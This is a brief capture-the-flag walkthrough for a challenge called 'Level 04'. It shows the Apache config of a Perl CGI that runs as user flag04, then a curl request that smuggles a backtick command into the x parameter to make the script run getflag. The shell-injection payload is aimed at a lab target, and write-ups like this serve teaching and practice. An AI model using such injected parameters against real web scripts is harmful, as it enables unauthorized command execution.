# Level 04

level04.pl is a CGI hosted on apache2 on port 4747 printing the value of the x parameter.

```sh
$ cat /etc/apache2/sites-enabled/level05.conf 
<VirtualHost *:4747>
	DocumentRoot	/var/www/level04/
	SuexecUserGroup flag04 level04
	<Directory /var/www/level04>
		Options +ExecCGI
		DirectoryIndex level04.pl
		AllowOverride None
		Order allow,deny
		Allow from all
		AddHandler cgi-script .pl
	</Directory>
```
From this configuration file, we can see that this CGI is executed by flag04. So if we make this script execute getflag, we win.


```sh
$ curl "localhost:4747?x=\`getflag\`"
```